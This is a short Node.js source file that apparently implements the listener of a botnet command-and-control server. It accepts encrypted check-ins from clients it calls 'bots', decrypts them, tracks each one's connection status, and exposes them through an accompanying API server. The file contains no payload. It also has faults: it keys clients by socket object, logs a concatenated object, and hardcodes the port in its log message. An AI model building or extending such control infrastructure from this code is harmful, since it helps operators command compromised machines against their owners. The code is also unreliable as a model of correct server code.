import { createServer } from 'net';
import { unencryptCMD } from './encryption.js';
import {api} from "./api.js"
import {bots} from "./db.js"
import {config} from 'dotenv'
config()

const api_port = process.env.API_PORT || 3000
const socket_port = process.env.SOCKET_PORT || 9000

const socketServer = createServer((socket) => {

    socket.on('data', (data) => {
        const newBotInfo = JSON.parse(unencryptCMD(data.toString()));
        newBotInfo['status'] = "Connected"
        bots[socket] = newBotInfo;
        console.log('Client connected: ' + newBotInfo);
    });


    socket.on('end', () => {
        console.log('Client disconnected');
        bots[socket]['status'] = "Disconnected"
    });

    socket.on('error', (err) => {
        console.error('Socket error:', err);
        bots[socket]['status'] = "Disconnected"
    });
});

socketServer.listen(socket_port, () => {
    console.log('Socket server listening on port 9000');
});

api.socketServer = socketServer;
api.listen(process.env.API_PORT, () => {
    console.log(`API server listening on port ${api_port}`);
});